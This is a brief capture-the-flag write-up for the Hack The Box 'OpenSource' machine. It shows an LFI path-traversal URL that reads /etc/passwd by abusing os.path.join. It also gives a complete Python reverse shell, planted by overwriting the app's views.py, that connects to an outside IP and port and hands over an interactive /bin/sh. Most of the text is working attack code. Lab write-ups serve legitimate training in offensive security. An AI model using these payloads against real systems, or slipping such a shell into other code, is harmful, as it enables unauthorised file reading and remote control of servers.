# htb-opensource

# User Access
### LFI

`os.path.join` function has an input of path, if this input equals to an absolute path, the command will throw other inputs and only reads the absolute path.

so getting the following URL gives us `/etc/passwd`

~~~
/uploads/..//etc/passwd
~~~


### Reverse shell

uploaded a `reverseshell.py` into /app/app/views.py

~~~
import os
from os import dup2
from subprocess import run

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.101",3948)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/sh","-i"])
~~~
